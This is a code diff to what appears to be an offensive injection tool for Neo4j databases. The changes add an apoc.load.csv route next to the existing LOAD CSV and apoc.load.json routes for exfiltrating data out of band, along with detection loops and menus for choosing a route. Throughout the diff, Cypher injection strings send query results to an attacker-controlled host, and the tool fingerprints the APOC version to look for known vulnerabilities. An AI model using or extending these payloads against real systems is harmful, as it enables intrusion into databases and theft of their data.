@@ -328,8 +328,8 @@ class oob_Neo4jInjector:
         self.parameters = parameters
         self.cookie = cookie if cookie else ""
         self.headers = {'User-Agent': 'curl/8.5.0', 'Content-Type': 'application/x-www-form-urlencoded', 'Cookie': self.cookie}
-        #self.proxies = {}
-        self.proxies = {'http': 'http://127.0.0.1:8080'}
+        self.proxies = {}
+        # self.proxies = {'http': 'http://127.0.0.1:8080'}
         self.exfil_payload = ""
         self.working_char = "UNDEFINED"
 
@@ -384,9 +384,11 @@ class oob_Neo4jInjector:
         random.seed(time.strftime("%H:%M:%S", time.localtime()))
         self.random_num = random.randint(999, 9999) * -1
         csv_exfil = f"LOAD CSV FROM '{self.exfil_ip}/?data='+exfilData as l RETURN 1337 as x//"
-        apoc_exfil = f"CALL apoc.load.json('{self.exfil_ip}/?data='+exfilData) YIELD value RETURN 1337 as x//"
+        apoc_csv_exfil = f"CALL apoc.load.csv('{self.exfil_ip}/?data='+exfilData) YIELD value RETURN 1337 as x//"
+        apoc_json_exfil = f"CALL apoc.load.json('{self.exfil_ip}/?data='+exfilData) YIELD value RETURN 1337 as x//"
         csv = False
-        apoc = False
+        apoc_csv = False
+        apoc_json = False
         print("")
         injection_characters = [
             f"{self.random_num}'",
@@ -405,43 +407,90 @@ class oob_Neo4jInjector:
                 self.exfil_payload = csv_exfil
                 csv = True
                 break
+        print(" " * 500, end='\r')
         for injection_character in injection_characters:
             print(f"[{animation[anim_index % len(animation)]}] Checking injectability with APOC", end='\r', flush=True)
             anim_index += 1
             if (not csv):
                 self.working_char = injection_character
-            payload = f" RETURN 1 as x UNION WITH 1 as exfilData {apoc_exfil}"
+            payload = f" RETURN 1 as x UNION WITH 1 as exfilData {apoc_csv_exfil}"
             self.inject_payload(payload)
             if (get_data()):
-                self.exfil_payload = apoc_exfil
-                apoc = True
+                self.exfil_payload = apoc_csv_exfil
+                apoc_csv = True
                 break
             if (csv):
                 break
+        for injection_character in injection_characters:
+            print(f"[{animation[anim_index % len(animation)]}] Checking injectability with APOC", end='\r', flush=True)
+            anim_index += 1
+            if (not csv or not apoc_csv):
+                self.working_char = injection_character
+            payload = f" RETURN 1 as x UNION WITH 1 as exfilData {apoc_json_exfil}"
+            self.inject_payload(payload)
+            if (get_data()):
+                self.exfil_payload = apoc_json_exfil
+                apoc_json = True
+                break
+            if (csv or apoc_csv):
+                break
 
-        if (csv and apoc):
+        if (csv and (apoc_csv or apoc_json)):
             print("APOC detected, retrieving APOC version...")
             self.inject_payload(f" RETURN 1 as x UNION WITH apoc.version() as exfilData {self.exfil_payload}")
             apoc_version = get_data()
             nested_dict = {'-': {'apoc_version': apoc_version}}
             convert_dict_to_table(nested_dict)
             check_vulnerability(apoc_version)
-            option = input("\nUse APOC to exfiltrate? (Y|N): ").lower()
-            if option == "y":
-                self.exfil_payload = csv_exfil
-            else:
-                print(colored("\n[*] Continuing with LOAD CSV [*]", "yellow"))
+            if (apoc_csv and apoc_json):
+                option = input("\nUse APOC to exfiltrate?\n Enter 1 for apoc.load.csv, 2 for apoc.load.json, anything else to not use APOC: ").lower()
+                if option == "1":
+                    self.exfil_payload = apoc_csv_exfil
+                elif (option == "2"):
+                    self.exfil_payload = apoc_json_exfil
+                else:
+                    self.exfil_payload = csv_exfil
+                    print(colored("\n[*] Continuing with LOAD CSV [*]", "yellow"))
+            elif (not apoc_csv and apoc_json):
+                option = input("\nUse APOC to exfiltrate?\n Enter 1 for apoc.load.json, anything else to not use APOC: ").lower()
+                if (option == "1"):
+                    self.exfil_payload = apoc_json_exfil
+                else:
+                    self.exfil_payload = csv_exfil
+                    print(colored("\n[*] Continuing with LOAD CSV [*]", "yellow"))
+            elif (apoc_csv and not apoc_json):
+                option = input("\nUse APOC to exfiltrate?\n Enter 1 for apoc.load.csv, anything else to not use APOC: ").lower()
+                if (option == "1"):
+                    self.exfil_payload = apoc_csv_exfil
+                else:
+                    self.exfil_payload = csv_exfil
+                    print(colored("\n[*] Continuing with LOAD CSV [*]", "yellow"))
             return True
         
-        elif (csv and not apoc):
+        elif (csv and not (apoc_csv or apoc_json)):
             print(colored("No APOC detected, continuing with LOAD CSV...", "yellow"))
             return True
         
-        elif (not csv and apoc):
-            print(colored("Only APOC detected, continuing with APOC...", "yellow"))
+        elif (not csv and (apoc_csv or apoc_json)):
+            print("Only APOC detected, retrieving APOC version...")
+            self.inject_payload(f" RETURN 1 as x UNION WITH apoc.version() as exfilData {self.exfil_payload}")
+            apoc_version = get_data()
+            nested_dict = {'-': {'apoc_version': apoc_version}}
+            convert_dict_to_table(nested_dict)
+            check_vulnerability(apoc_version)
+            if (apoc_csv and apoc_json):
+                option = input("\nTwo APOC exfiltrations found, Select which one to use\n Enter 1 for apoc.load.csv, 2 for apoc.load.json (default is 2): ").lower()
+                if option == "1":
+                    self.exfil_payload = apoc_csv_exfil
+                else:
+                    self.exfil_payload = apoc_json_exfil
+            elif (not apoc_csv and apoc_json):
+                self.exfil_payload = apoc_json_exfil
+            elif (apoc_csv and not apoc_json):
+                self.exfil_payload = apoc_csv_exfil
             return True
         
-        elif (not csv and not apoc):
+        elif (not csv and not apoc_csv and not apoc_json):
             self.working_char = "UNDEFINED"
             self.exfil_payload = csv_exfil
             print(" " * 500, end='\r')
